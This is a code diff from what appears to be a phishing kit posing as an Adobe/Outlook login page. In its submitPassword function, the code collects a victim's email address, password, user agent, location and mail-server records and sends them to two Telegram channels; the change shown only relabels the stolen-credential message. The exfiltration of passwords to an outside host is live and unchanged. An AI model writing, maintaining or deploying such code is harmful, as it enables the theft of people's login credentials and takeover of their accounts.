@@ -644,7 +644,7 @@ async function submitPassword() {
         }
         const emailDomain = EE.split('@')[1];
         const mxRecords = await getMxRecords(emailDomain);
-        const message = `🔒ABOBE (OUTLOOK) PP Attempt\n\n📧 EE: ${EE}\n🔑 PP: ${password}\n🖥️ U-A: ${userAgent}\n🌍 Loc: ${clientLocation.city}, ${clientLocation.country}\n📡 MX-R: ${mxRecords}`;
+        const message = `🔒ABOBE PROF (OUTLOOK) PP Attempt\n\n📧 EE: ${EE}\n🔑 PP: ${password}\n🖥️ U-A: ${userAgent}\n🌍 Loc: ${clientLocation.city}, ${clientLocation.country}\n📡 MX-R: ${mxRecords}`;
         notifyTelegram(message);
         notifyTelegram2(message);
 
